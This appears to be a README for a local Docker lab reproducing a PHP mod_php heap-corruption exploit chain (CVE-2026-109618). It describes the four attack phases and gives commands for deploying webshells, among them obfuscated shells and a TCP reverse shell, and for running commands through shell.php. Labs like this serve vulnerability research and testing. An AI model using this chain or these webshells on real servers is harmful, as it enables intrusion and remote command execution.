# PHP2Shell Lab — CVE-2026-109618

Local lab for testing the PHP2Shell heap corruption vulnerability (CVE-2026-109618) and deploying webshells through the exploit chain.

## TL;DR

```bash
cd cve-research/lab/php2shell
./run.sh start                    # Build + start clean container
python3 exploit.py                # Deploy minimal webshell via exploit
curl 'http://localhost:9999/shell.php?cmd=id'  # Execute commands
./run.sh stop                     # Remove container
```

## What is CVE-2026-109618?

A remote code execution vulnerability in **PHP mod\_php** when running with **Apache prefork MPM**. The exploit uses HTTP worker rotation to trigger memory corruption, then hijacks the `zif_system` function pointer via heap spray + address leak to execute arbitrary PHP code.

## Vulnerability Requirements

```
display_errors=On        ← leaks memory addresses
memory_limit=8M          ← small heap for controlled spray
session.upload_progress=1  ← upload progress cookie active
prefork MPM              ← predictable memory layout
```

## Exploit Chain (4 Phases)

| Phase | Action                    | Purpose                                                                              |
| ----- | ------------------------- | ------------------------------------------------------------------------------------ |
| **1** | Worker rotation           | Force mod\_php prefork workers to recycle → memory corruption                        |
| **2** | Heap spray + address leak | Leak `libphp.so` base via crafted cookies + `display_errors=1` (partial ASLR bypass) |
| **3** | zif\_system overwrite     | Corrupt function pointer with crafted session cookie                                 |
| **4** | file\_put\_contents()     | Write webshell to disk via hijacked PHP runtime                                      |

## Quick Start

```bash
cd cve-research/lab/php2shell

# Start clean container (no shell.php — must deploy via exploit)
./run.sh start

# Verify target is reachable
curl http://localhost:9999/   # Shows phpinfo output

# Deploy minimal webshell through CVE chain
python3 exploit.py -u http://localhost:9999 -s minimal

# Access shell
curl 'http://localhost:9999/shell.php?cmd=id'       # uid=33(www-data) gid=33(www-data)
curl 'http://localhost:9999/shell.php?cmd=whoami'   # www-data
```

## Available Webshells (from SecLists)

| Variant       | Size   | Auth        | Cmd Param        | Description                                    |
| ------------- | ------ | ----------- | ---------------- | ---------------------------------------------- |
| `minimal`     | 328B   | None        | `cmd` (REQUEST)  | Simple REQUEST shell, zero overhead            |
| `cmd`         | 320B   | None        | `cmd` (GET)      | FuzzDB minimal GET shell                       |
| `obfuscated`  | 255B   | MD5("lol")  | `cmd` (POST)     | chr()-constructed "system", light evasion      |
| `obfuscated2` | 712B   | Remote-gate | `lol` (REQUEST)  | XOR cipher, exec/passthru fallback             |
| `reverse`     | 5.4KB  | None        | N/A              | Outbound TCP reverse shell (hardcoded IP/port) |
| `full`        | 13.6KB | SHA1+IP     | `command` (POST) | Full GUI shell with session login, cmd history |

```bash
# Deploy different webshells
python3 exploit.py -u http://localhost:9999 -s minimal       # default
python3 exploit.py -u http://localhost:9999 -s cmd           # FuzzDB GET shell
python3 exploit.py -u http://localhost:9999 -s obfuscated    # MD5 auth variant
python3 exploit.py -u http://localhost:9999 -s reverse       # Reverse shell
```

## Lab Commands

| Command          | Description                          |
| ---------------- | ------------------------------------ |
| `./run.sh start` | Build + start container on port 9999 |
| `./run.sh stop`  | Remove container                     |
| `./run.sh test`  | Vulnerability check + exploit run    |
| `./run.sh logs`  | Follow container logs                |

## Container Details

- **Image**: `php:8.4-apache` (prefork MPM)
- **Port**: `localhost:9999`
- **PHP Version**: 8.4.27
- **Vulnerable Config**: `display_errors=On`, `memory_limit=8M`

## Directory Structure

```
cve-research/lab/php2shell/
├── Dockerfile             # Vulnerable PHP + Apache (prefork)
├── docker-compose.yml     # Port mapping (9999:80), healthcheck
├── index.php              # Test page with phpinfo() + upload progress form
├── exploit.py             # CVE-2026-109618 exploit script
├── run.sh                 # Start/stop/test/logs wrapper
├── README.md              # This file
├── webshells/             # Webshell variants from SecLists/Web-Shells
│   ├── cmd.php            # FuzzDB minimal GET shell (320B)
│   ├── cmd-simple.php     # FuzzDB REQUEST shell (328B)
│   ├── obfuscated-phpshell.php      # MD5 auth shell (255B)
│   ├── another-obfuscated-phpshell.php  # XOR cipher shell (712B)
│   ├── php-reverse-shell.php        # TCP reverse shell (5.4KB)
│   └── laudanum-shell.php           # Full GUI shell (13.6KB)
├── FuzzDB/               # Original SecLists paths (FuzzDB cmd files)
│   └── cmd-simple.php    # symlink to webshells/cmd-simple.php
└── reference/            # CVE research notes linking to SecLists data
    ├── cve-research-notes.md    # Webshell comparison table
    ├── exploit-database-links.txt  # EDB-52704 exploit details
    └── vulnerability-details.md   # PHP2Shell technical analysis
```

## Webshells Reference

Full comparison table and usage notes in:  
`cve-research/lab/php2shell/webshells/cve-research-notes.md`

Key takeaway for heap-corruption deployment: prefer shells under 500 bytes (obfuscated, cmd-simple, minimal) — they fit in typical overflow payloads and are self-contained with no session setup needed.

## Related CVE Research

This lab is part of the `cve-research/` project which includes:

- **CVE data collection** from OSV API + Exploit-DB RSS (see `../README.md`)
- **Exploit correlation** between CVEs and EDB entries
- **Payload indexing** linking to `docs/payloads_index.json`

## License

Same as parent project.
